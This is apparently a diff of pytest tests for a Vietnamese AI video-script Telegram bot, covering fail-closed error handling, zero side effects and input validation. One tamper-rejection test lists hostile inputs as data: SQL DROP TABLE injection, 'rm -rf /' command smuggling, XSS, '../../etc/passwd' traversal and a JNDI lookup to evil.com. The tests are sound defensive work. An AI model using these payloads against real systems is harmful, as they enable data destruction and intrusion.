@@ -657,25 +657,533 @@ async def test_no_job_before_content_valid():
 
 
 # ==============================================================================
-# 11. FAILURE SEMANTICS TRUTH
+# 11. FAILURE SEMANTICS, ZERO SIDE EFFECTS & PUBLIC INPUT TRUTH
 # ==============================================================================
 
-def test_failure_semantics_distinct_blockers():
-    """Distinct blocker classification is maintained for content generation errors."""
-    error_classes = [
-        "AI_NOT_CONFIGURED",
-        "AI_UNAVAILABLE",
-        "AI_TIMEOUT",
-        "AI_INVALID_RESPONSE",
-        "EMPTY_GENERATION",
-        "INVALID_USER_INPUT",
-        "STALE_DRAFT",
-        "REVISION_CONFLICT",
-    ]
-    # Verify no secret keywords leaked into error labels
-    for err in error_classes:
-        assert "sk-" not in err.lower()
-        assert "key" not in err.lower() or err == "AI_NOT_CONFIGURED"
+@pytest.mark.anyio
+async def test_failure_semantics_ai_unconfigured_production_handler():
+    """AI unconfigured fails closed via production handler, returning exact notice and 0 side-effects."""
+    user_id = 888101
+    query = MagicMock()
+    query.edit_message_text = AsyncMock()
+    session = {
+        "user_id": user_id,
+        "draft": {
+            "script_topic": "Sản phẩm test unconfigured",
+            "script_duration_seconds": 40,
+            "script_entry_scene_count": 5,
+            "script_ai_revision": 1,
+        },
+    }
+    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, side_effect=RuntimeError("AI unconfigured: missing provider API key")), \
+         patch("bot.task3d_session_step") as mock_step, \
+         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
+         patch("bot.video_script_duration_keyboard", return_value=MagicMock()):
+
+        await bot.video_script_generate_ai(query, user_id, session, "vi")
+
+        mock_step.assert_called_once()
+        kwargs = mock_step.call_args[1]
+        assert kwargs.get("script_provider_error") == "RuntimeError"
+        assert kwargs.get("job_created") is False
+        assert kwargs.get("outbox_created") is False
+        assert kwargs.get("xu_charged") == 0
+        assert kwargs.get("provider_called") is True
+        assert mock_send.call_count >= 1
+        sent_text = mock_send.call_args[0][1]
+        assert "⚠️ Chưa tạo được kịch bản từ nguồn AI" in sent_text
+
+
+@pytest.mark.anyio
+async def test_failure_semantics_provider_timeout_production_handler():
+    """Provider timeout fails closed via production handler, returning exact notice and 0 side-effects."""
+    user_id = 888102
+    query = MagicMock()
+    query.edit_message_text = AsyncMock()
+    session = {
+        "user_id": user_id,
+        "draft": {
+            "script_topic": "Sản phẩm test timeout",
+            "script_duration_seconds": 40,
+            "script_entry_scene_count": 5,
+            "script_ai_revision": 1,
+        },
+    }
+    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, side_effect=TimeoutError("upstream provider timed out")), \
+         patch("bot.task3d_session_step") as mock_step, \
+         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
+         patch("bot.video_script_duration_keyboard", return_value=MagicMock()):
+
+        await bot.video_script_generate_ai(query, user_id, session, "vi")
+
+        mock_step.assert_called_once()
+        kwargs = mock_step.call_args[1]
+        assert kwargs.get("script_provider_error") == "TimeoutError"
+        assert kwargs.get("job_created") is False
+        assert kwargs.get("outbox_created") is False
+        assert kwargs.get("xu_charged") == 0
+        assert mock_send.call_count >= 1
+        sent_text = mock_send.call_args[0][1]
+        assert "⚠️ Chưa tạo được kịch bản từ nguồn AI" in sent_text
+
+
+@pytest.mark.anyio
+async def test_failure_semantics_empty_response_production_handler():
+    """Empty AI response produces exact 'empty_script' blocker and zero side effects."""
+    user_id = 888103
+    query = MagicMock()
+    query.edit_message_text = AsyncMock()
+    session = {
+        "user_id": user_id,
+        "draft": {
+            "script_topic": "Sản phẩm test empty response",
+            "script_duration_seconds": 40,
+            "script_entry_scene_count": 5,
+            "script_ai_revision": 1,
+        },
+    }
+    with patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value="   \n   "), \
+         patch("bot.task3d_session_step") as mock_step, \
+         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
+         patch("bot.video_script_duration_keyboard", return_value=MagicMock()):
+
+        await bot.video_script_generate_ai(query, user_id, session, "vi")
+
+        mock_step.assert_called_once()
+        kwargs = mock_step.call_args[1]
+        assert kwargs.get("script_provider_error") == "empty_script"
+        assert kwargs.get("job_created") is False
+        assert kwargs.get("outbox_created") is False
+        assert kwargs.get("xu_charged") == 0
+        assert mock_send.call_count >= 1
+        sent_text = mock_send.call_args[0][1]
+        assert "⚠️ Nguồn AI chưa trả về kịch bản có nội dung" in sent_text
+
+
+@pytest.mark.anyio
+async def test_failure_semantics_invalid_manual_input_production_handler():
+    """Invalid manual inputs raise exact production errors and return exact UI notices with 0 side effects."""
+    from services import video_flow7
+
+    user_id = 888104
+    # Missing script
+    with pytest.raises(ValueError) as exc1:
+        bot.video_flow7_store_script_proposal(user_id, "", source="customer")
+    assert str(exc1.value) == "script_missing"
+
+    # Over 20 scenes script
+    with patch("services.video_flow7.parse_script_proposal", return_value={"source_text": "sample", "proposed_scene_count": 25, "coverage": {"no_truncation": True, "exact_match": True}}):
+        with pytest.raises(ValueError) as exc2:
+            bot.video_flow7_store_script_proposal(user_id, "sample", source="customer")
+        assert str(exc2.value) == "script_scene_count_over_limit"
+
+    # Incomplete coverage
+    with patch("services.video_flow7.parse_script_proposal", return_value={"source_text": "sample", "proposed_scene_count": 3, "coverage": {"no_truncation": False, "exact_match": False}}):
+        with pytest.raises(ValueError) as exc3:
+            bot.video_flow7_store_script_proposal(user_id, "sample", source="customer")
+        assert str(exc3.value) == "script_coverage_incomplete"
+
+    # Script contract gate blockers
+    assert video_flow7.script_contract_gate({"manual_script_raw": ""})["blocker"] == "script_missing"
+    assert video_flow7.script_contract_gate({"manual_script_raw": "abc", "scene_count": 25})["blocker"] == "script_scene_count_invalid"
+    assert video_flow7.script_contract_gate({"manual_script_raw": "abc", "scene_count": 5, "scene_count_confirmed": False})["blocker"] == "script_scene_count_not_confirmed"
+
+    # End-to-end via handle_video_product_pending_text awaiting_existing_script
+    update = MagicMock()
+    update.effective_user.id = user_id
+    update.message = MagicMock()
+    update.message.reply_text = AsyncMock()
+    context = MagicMock()
+
+    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "step": "awaiting_existing_script", "current_step": "awaiting_existing_script", "draft": {}}):
+        # 1. Empty text input
+        update.message.text = "   "
+        handled = await bot.handle_video_product_pending_text(update, context)
+        assert handled is True
+        update.message.reply_text.assert_called()
+        assert "⚠️ Kịch bản đang trống" in update.message.reply_text.call_args[0][0]
+
+        # 2. Overlimit input via production handler branch
+        with patch("bot.video_flow7_store_script_proposal", side_effect=ValueError("script_scene_count_over_limit")):
+            update.message.text = "too long script content"
+            handled = await bot.handle_video_product_pending_text(update, context)
+            assert handled is True
+            assert "⚠️ Kịch bản có hơn 20 ranh giới cảnh" in update.message.reply_text.call_args[0][0]
+
+        # 3. Incomplete coverage via production handler branch
+        with patch("bot.video_flow7_store_script_proposal", side_effect=ValueError("script_coverage_incomplete")):
+            update.message.text = "truncated script content"
+            handled = await bot.handle_video_product_pending_text(update, context)
+            assert handled is True
+            assert "⚠️ Chưa chứng minh được toàn bộ kịch bản đã được giữ" in update.message.reply_text.call_args[0][0]
+
+
+@pytest.mark.anyio
+async def test_failure_semantics_stale_generation_production_handler():
+    """Stale generation invocations and completions drop cleanly with 0 side effects."""
+    user_id = 888105
+    query = MagicMock()
+    query.edit_message_text = AsyncMock()
+    stale_session = {
+        "user_id": user_id,
+        "draft": {
+            "script_topic": "Chủ đề video",
+            "script_duration_seconds": 40,
+            "script_entry_scene_count": 5,
+            "script_ai_revision": 1,
+        },
+    }
+    active_session = {
+        "user_id": user_id,
+        "step": "script_ai_duration",
+        "draft": {
+            "script_topic": "Chủ đề video",
+            "script_duration_seconds": 40,
+            "script_entry_scene_count": 5,
+            "script_ai_revision": 2,
+        },
+    }
+    # 1. Stale invocation
+    with patch("bot.get_video_session", return_value=active_session), \
+         patch("bot.generate_video_script_pack", new_callable=AsyncMock) as mock_ai, \
+         patch("bot.task3d_session_step") as mock_step:
+
+        result = await bot.video_script_generate_ai(query, user_id, stale_session, "vi")
+        assert result == active_session
+        mock_ai.assert_not_called()
+        mock_step.assert_not_called()
+
+    # 2. Stale completion (active revision bumped while AI was computing)
+    completion_session = {
+        "user_id": user_id,
+        "draft": {
+            "script_topic": "Chủ đề video",
+            "script_duration_seconds": 40,
+            "script_entry_scene_count": 5,
+            "script_ai_revision": 2,
+        },
+    }
+    bumped_session = {
+        "user_id": user_id,
+        "step": "script_ai_platform",
+        "draft": {
+            "script_topic": "Chủ đề video",
+            "script_duration_seconds": 40,
+            "script_entry_scene_count": 5,
+            "script_ai_revision": 3,
+        },
+    }
+    valid_script = (
+        "1. TÊN KỊCH BẢN\nDemo\n"
+        "2. CONCEPT\nDemo concept\n"
+        "3. HOOK\nDemo hook\n"
+        "4. MỞ BÀI\nDemo mở\n"
+        "5. DIỄN BIẾN\nDemo diễn biến\n"
+        "6. CAO TRÀO\nDemo cao trào\n"
+        "7. KẾT\nDemo kết\n"
+        "8. CTA\nDemo cta\n"
+        "9. NGƯỜI DẪN\nDemo dẫn\n"
+        "10. NHÂN VẬT\nDemo nhân vật\n"
+        "Cảnh 1: Một\nCảnh 2: Hai\nCảnh 3: Ba\nCảnh 4: Bốn\nCảnh 5: Năm"
+    )
+    with patch("bot.get_video_session", return_value=bumped_session), \
+         patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value=valid_script), \
+         patch("bot.video_flow7_store_script_proposal", return_value=({}, {"scenes": [1, 2, 3, 4, 5]})), \
+         patch("bot.task3d_session_step") as mock_step:
+
+        result = await bot.video_script_generate_ai(query, user_id, completion_session, "vi")
+        assert result == bumped_session
+        mock_step.assert_not_called()
+
+
+@pytest.mark.anyio
+async def test_zero_execution_side_effects_on_invalid_content_with_db_spies():
+    """Spy real execution/dispatch boundaries and verify zero calls and zero row count deltas across all tables."""
+    import sqlite3
+    from services import video_project_queue as queue
+
+    conn = sqlite3.connect(":memory:")
+    conn.row_factory = sqlite3.Row
+    queue.ensure_video_project_queue_schema(conn)
+
+    tables = ["video_projects", "video_jobs", "video_dispatch_outbox", "video_scenes"]
+    initial_counts = {t: conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0] for t in tables}
+
+    with patch("services.video_project_queue.confirm_public_product_video_invoice") as spy_confirm, \
+         patch("services.video_project_queue._confirm_product_video_invoice_atomic") as spy_atomic, \
+         patch("services.video_project_queue._insert_product_video_dispatch_outbox_record") as spy_outbox, \
+         patch("services.video_project_queue.claim_product_video_dispatch_outbox") as spy_claim_dispatch, \
+         patch("services.video_project_queue.claim_next_video_job") as spy_claim_job:
+
+        user_id = 999301
+        query = MagicMock()
+        query.edit_message_text = AsyncMock()
+
+        # Scenario 1: Empty script
+        session_empty = {
+            "user_id": user_id,
+            "draft": {"script_topic": "Test empty", "script_duration_seconds": 40, "script_entry_scene_count": 5},
+        }
+        with patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value=""), \
+             patch("bot.safe_edit_or_send", new_callable=AsyncMock), \
+             patch("bot.video_script_duration_keyboard", return_value=MagicMock()):
+            await bot.video_script_generate_ai(query, user_id, session_empty, "vi")
+
+        # Scenario 2: Truncated script (fails parse / coverage)
+        session_trunc = {
+            "user_id": user_id,
+            "draft": {"script_topic": "Test trunc", "script_duration_seconds": 40, "script_entry_scene_count": 5},
+        }
+        with patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value="short"), \
+             patch("bot.video_flow7_store_script_proposal", side_effect=ValueError("script_coverage_incomplete")), \
+             patch("bot.safe_edit_or_send", new_callable=AsyncMock), \
+             patch("bot.video_script_duration_keyboard", return_value=MagicMock()):
+            await bot.video_script_generate_ai(query, user_id, session_trunc, "vi")
+
+        # Scenario 3: Unparseable manual script
+        with pytest.raises(ValueError):
+            bot.video_flow7_store_script_proposal(user_id, "", source="customer")
+
+        # Scenario 4: Invalid duration / scene count
+        with patch("services.video_flow7.parse_script_proposal", return_value={"source_text": "sample", "proposed_scene_count": 25, "coverage": {"no_truncation": True, "exact_match": True}}):
+            with pytest.raises(ValueError):
+                bot.video_flow7_store_script_proposal(user_id, "sample", source="customer")
+
+        # Scenario 5: Stale generation result
+        with patch("bot.get_video_session", return_value={"draft": {"script_ai_revision": 5}}), \
+             patch("bot.generate_video_script_pack", new_callable=AsyncMock):
+            await bot.video_script_generate_ai(query, user_id, {"draft": {"script_ai_revision": 1}}, "vi")
+
+        # Assert ALL spied dispatch/execution calls remain strictly 0
+        assert spy_confirm.call_count == 0
+        assert spy_atomic.call_count == 0
+        assert spy_outbox.call_count == 0
+        assert spy_claim_dispatch.call_count == 0
+        assert spy_claim_job.call_count == 0
+
+        # Assert row count deltas across all tables remain strictly 0
+        current_counts = {t: conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0] for t in tables}
+        assert current_counts == initial_counts
+        for t in tables:
+            assert current_counts[t] == 0
+
+
+@pytest.mark.anyio
+async def test_platform_public_input_validation_handler_and_tamper_rejection():
+    """Audit all platform entry paths: supported platforms succeed, empty/unknown/tampered inputs are rejected."""
+    uid = 999401
+
+    # 1. Pure validation function truth
+    supported = ["tiktok_reels", "youtube_shorts", "facebook", "ads_landing", "multi"]
+    for p in supported:
+        ok, key, label = video_script_product.validate_platform(p)
+        assert ok is True
+        assert key == p
+        assert len(label) > 0
+
+    # Also canonical label support
+    for key, label in video_script_product.PLATFORMS.items():
+        ok, k, l = video_script_product.validate_platform(label)
+        assert ok is True
+        assert k == key
+
+    # Empty / missing
+    for invalid in ["", "   ", None]:
+        ok, key, label = video_script_product.validate_platform(invalid)
+        assert ok is False
+        assert key == ""
+
+    # Unknown
+    for unknown in ["twitter", "threads", "snapchat", "random_social"]:
+        ok, key, label = video_script_product.validate_platform(unknown)
+        assert ok is False
+        assert key == ""
+
+    # Tampered / injections
+    for tampered in [
+        "'; DROP TABLE video_projects; --",
+        "tiktok_reels; rm -rf /",
+        "<script>alert('xss')</script>",
+        "../../etc/passwd",
+        "${jndi:ldap://evil.com}",
+    ]:
+        ok, key, label = video_script_product.validate_platform(tampered)
+        assert ok is False
+        assert key == ""
+
+    # 2. Production Callback Handler: handle_video_product_callback
+    update = MagicMock()
+    context = MagicMock()
+    context._product_video_callback_data_override = ""
+    query = MagicMock()
+    query.from_user.id = uid
+    query.answer = AsyncMock()
+    query.edit_message_text = AsyncMock()
+    query.message = MagicMock()
+    query.message.reply_text = AsyncMock()
+    update.callback_query = query
+
+    # Supported callback advances to script_ai_duration and persists canonical platform
+    query.data = "vproduct|script_platform|tiktok_reels"
+    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "draft": {}}), \
+         patch("bot.task3d_session_step") as mock_step, \
+         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
+        mock_step.return_value = {"step": "script_ai_duration", "draft": {"script_platform": "tiktok_reels"}}
+        await bot.handle_video_product_callback(update, context)
+        mock_step.assert_called_with(
+            uid,
+            "script_ai_duration",
+            script_platform="tiktok_reels",
+            script_platform_label="TikTok / Reels",
+            provider_called=False,
+            xu_charged=0,
+        )
+        mock_render.assert_called_once()
+
+    # Tampered callback is rejected, does NOT persist into draft, returns to script_ai_platform
+    query.data = "vproduct|script_platform|'; DROP TABLE users; --"
+    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "draft": {}}), \
+         patch("bot.task3d_session_step") as mock_step, \
+         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
+        await bot.handle_video_product_callback(update, context)
+        mock_step.assert_called_with(uid, "script_ai_platform")
+        assert "script_platform" not in mock_step.call_args[1]
+        mock_render.assert_called_once()
+
+    # Empty callback is rejected
+    query.data = "vproduct|script_platform|"
+    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "draft": {}}), \
+         patch("bot.task3d_session_step") as mock_step, \
+         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
+        await bot.handle_video_product_callback(update, context)
+        mock_step.assert_called_with(uid, "script_ai_platform")
+        assert "script_platform" not in mock_step.call_args[1]
+
+    # 3. Production Text Input Handler: handle_video_product_pending_text (awaiting_script_ai_platform)
+    msg_update = MagicMock()
+    msg_update.effective_user.id = uid
+    msg_update.message = MagicMock()
+    msg_update.message.reply_text = AsyncMock()
+
+    # Tampered text input is rejected cleanly, resets to script_ai_platform without saving tampered value
+    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "step": "awaiting_script_ai_platform", "current_step": "awaiting_script_ai_platform", "draft": {}}), \
+         patch("bot.task3d_session_step") as mock_step, \
+         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
+        msg_update.message.text = "'; DROP TABLE users; --"
+        handled = await bot.handle_video_product_pending_text(msg_update, context)
+        assert handled is True
+        mock_step.assert_called_with(uid, "script_ai_platform", provider_called=False, xu_charged=0)
+        assert "script_platform" not in mock_step.call_args[1]
+        mock_render.assert_called_once()
+
+    # 4. Prompt Generation Payload Immunity
+    tampered_draft = {
+        "script_topic": "Mỹ phẩm an toàn",
+        "script_platform": "DROP TABLE video_projects;--",
+        "script_entry_scene_count": 5,
+        "script_duration_seconds": 40,
+    }
+    prompt = video_script_product.build_ai_prompt(tampered_draft)
+    assert "DROP TABLE" not in prompt
+    assert "Nền tảng: Nhiều nền tảng" in prompt
+
+
+@pytest.mark.anyio
+async def test_video_idea_empty_and_whitespace_custom_note_safety():
+    """Empty and whitespace custom notes are safely ignored without corrupting idea plan or seeds."""
+    uid = 999501
+    base_idea = video_idea_catalog.ideas_for_category("sales", limit=1)[0]
+    initial_plan = video_idea_catalog.build_plan(base_idea, duration_seconds=16)
+
+    # 1. Pure catalog level verification
+    empty_res = video_idea_catalog.apply_custom_note(initial_plan, "")
+    assert empty_res["custom_note"] == ""
+    assert empty_res["image_prompt_final"] == initial_plan["image_prompt_seed"]
+    assert empty_res["video_prompt_final"] == initial_plan["video_prompt_seed"]
+    assert "Yêu cầu riêng:" not in empty_res["image_prompt_final"]
+
+    whitespace_res = video_idea_catalog.apply_custom_note(initial_plan, "   \n\t  ")
+    assert whitespace_res["custom_note"] == ""
+    assert whitespace_res["image_prompt_final"] == initial_plan["image_prompt_seed"]
+    assert whitespace_res["video_prompt_final"] == initial_plan["video_prompt_seed"]
+    assert "Yêu cầu riêng:" not in whitespace_res["image_prompt_final"]
+
+    # 2. Production text message handler: handle_developing_video_pending_text
+    update = MagicMock()
+    update.effective_user.id = uid
+    update.message = MagicMock()
+    context = MagicMock()
+
+    with patch("bot.get_developing_video_pending", return_value={"step": "catalog_edit", "flow": "videoidea", **initial_plan}), \
+         patch("bot.clear_developing_video_pending") as mock_clear, \
+         patch("bot.save_developing_video_plan", side_effect=lambda u, f, p: p) as mock_save, \
+         patch("bot.safe_reply_long_html", new_callable=AsyncMock) as mock_reply:
+
+        # Case A: Whitespace input is safely ignored without clearing or corrupting plan
+        update.message.text = "    \n   "
+        handled = await bot.handle_developing_video_pending_text(update, context)
+        assert handled is True
+        mock_clear.assert_not_called()
+        mock_save.assert_not_called()
+
+        # Case B: Valid text input applies note and updates plan cleanly
+        update.message.text = "thêm ánh sáng vàng ấm"
+        handled = await bot.handle_developing_video_pending_text(update, context)
+        assert handled is True
+        mock_clear.assert_called_with(uid)
+        mock_save.assert_called_once()
+        saved_plan = mock_save.call_args[0][2]
+        assert saved_plan["custom_note"] == "thêm ánh sáng vàng ấm"
+        assert "thêm ánh sáng vàng ấm" in saved_plan["video_prompt_final"]
+        assert saved_plan["provider_called"] is False
+        assert saved_plan["job_created"] is False
+        assert saved_plan["outbox_created"] is False
+        assert saved_plan["wallet_mutations"] == 0
+        assert saved_plan["xu_charged"] == 0
+        mock_reply.assert_called_once()
+
+
+@pytest.mark.anyio
+async def test_video_idea_stale_plan_blocks_subsequent_steps():
+    """Stale/missing Video Idea plan cleanly blocks subsequent generation and edit steps."""
+    uid = 999601
+    lang = "vi"
+    update = MagicMock()
+    context = MagicMock()
+    query = MagicMock()
+    query.from_user.id = uid
+    query.answer = AsyncMock()
+    query.edit_message_text = AsyncMock()
+    update.callback_query = query
+
+    # When no plan exists in store for user
+    with patch("bot.get_latest_developing_video_plan", return_value=None), \
+         patch("bot.get_developing_video_pending", return_value=None), \
+         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
+         patch("bot.safe_edit_or_send_long_html", new_callable=AsyncMock) as mock_send_long, \
+         patch("bot.video_profile_scene1_render", new_callable=AsyncMock) as mock_render:
+
+        # 1. Stale catalog_edit callback falls back cleanly to options / menu without corrupting
+        query.data = "videoidea|catalog_edit"
+        await bot.handle_video_idea_callback(update, context)
+        assert mock_send.call_count >= 1 or mock_send_long.call_count >= 1
+        call_text = mock_send.call_args[0][1] if mock_send.call_args else mock_send_long.call_args[0][1]
+        assert any(phrase in call_text for phrase in ["Chọn một hướng bằng nút số", "Ý TƯỞNG VIDEO", "Kho ý tưởng", "Bán hàng"])
+
+        # 2. Stale handoff callback blocks video render route
+        mock_send.reset_mock()
+        mock_send_long.reset_mock()
+        query.data = "videoidea|handoff"
+        await bot.handle_video_idea_callback(update, context)
+        mock_render.assert_not_called()
+        assert mock_send.call_count >= 1 or mock_send_long.call_count >= 1
+
+        # 3. Stale prompt preview callback blocks safely
+        mock_send.reset_mock()
+        mock_send_long.reset_mock()
+        query.data = "videoidea|catalog_image_prompt"
+        await bot.handle_video_idea_callback(update, context)
+        mock_render.assert_not_called()
 
 
 # ==============================================================================
